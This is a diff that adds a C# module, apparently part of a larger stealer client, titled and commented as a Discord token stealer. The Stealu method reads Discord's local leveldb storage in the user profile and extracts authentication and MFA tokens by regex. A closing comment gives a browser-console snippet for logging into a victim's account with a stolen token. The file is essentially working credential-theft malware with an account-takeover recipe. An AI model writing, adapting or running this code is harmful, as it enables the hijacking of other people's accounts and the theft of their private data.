@@ -1,0 +1,43 @@
+﻿using System;
+using System.Collections.Generic;
+using System.IO;
+using System.Linq;
+using System.Text;
+using System.Text.RegularExpressions;
+using System.Threading.Tasks;
+
+namespace Client.Armitage.Cookies
+{
+    public static class DiscordToken
+    {
+        /// <summary>
+        /// Steals discord token from the Windows app.
+        /// </summary>
+        public static List<string> Stealu() {
+
+            List<string> discordtokens = new List<string>();
+            DirectoryInfo rootfolder = new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\AppData\Roaming\Discord\Local Storage\leveldb");
+
+            foreach (var file in rootfolder.GetFiles(false ? "*.log" : "*.ldb"))
+            {
+                string readedfile = file.OpenText().ReadToEnd();
+
+                foreach (Match match in Regex.Matches(readedfile, @"[\w-]{24}\.[\w-]{6}\.[\w-]{27}"))
+                    discordtokens.Add(match.Value + "\n");
+
+                foreach (Match match in Regex.Matches(readedfile, @"mfa\.[\w-]{84}"))
+                    discordtokens.Add(match.Value + "\n");
+            }
+
+            Console.WriteLine(discordtokens);
+
+            return discordtokens.ToList();
+        }
+        /*
+        To log in:
+            Open Console on browser.
+                > function login(token) { setInterval(() => { document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token = `"${token}"` }, 50); setTimeout(() => { location.reload(); }, 2500); }
+                > login("token")
+         */
+    }
+}
